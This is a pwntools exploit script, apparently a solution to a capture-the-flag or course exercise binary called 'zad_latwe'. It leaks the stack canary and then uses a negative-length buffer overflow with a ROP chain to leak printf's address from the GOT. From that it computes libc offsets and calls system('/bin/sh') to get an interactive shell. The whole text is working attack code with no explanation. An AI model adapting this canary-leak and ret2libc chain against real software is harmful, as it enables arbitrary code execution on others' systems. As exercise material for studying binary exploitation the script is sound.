from pwn import *

printf_offset = 0x51120
system_offset = 0x40db0
binsh_offset = 0x168ed3


# leak canary

p = process('./zad_latwe')

p.recvuntil("):")
p.send("263\n")
p.recvuntil("bufor:\n")
p.send(" " * 263 + "\n")

canary = p.recv(33)
canary = canary.split(" ")[1].split("\n")[0]
canary = int(canary)
canary &= 0xffffffffffffffff

print("Canary: %s" % hex(canary))


# leak libc addr

p.recvuntil("):")
p.send("-200\n")
p.recvuntil("bufor:\n")

msg = 264 * 'a'
msg += p64(canary)
msg += 'a' * 8
msg += p64(0x400ae3) # pop rdi; ret;
msg += p64(0x601028) # printf address in GOT
msg += p64(0x400720) # puts address in PLT
msg += p64(0x400a5e) # call unpack_long_long

p.send(msg)

printf_addr = p.recv(7)[:6]

printf_addr += '\x00\x00'

printf_addr = u64(printf_addr)
libc_addr = printf_addr - printf_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset

print("Printf: %s" % hex(printf_addr))
print("Libc: %s" % hex(libc_addr))


# Inject shellcode

p.recvuntil("):")
p.send("-200\n")
p.recvuntil("bufor:\n")

msg = 264 * 'a'
msg += p64(canary)
msg += 'a' * 8
msg += p64(0x400ae3) # pop rdi; ret;
msg += p64(binsh_addr)
msg += p64(system_addr)

p.send(msg)

p.interactive()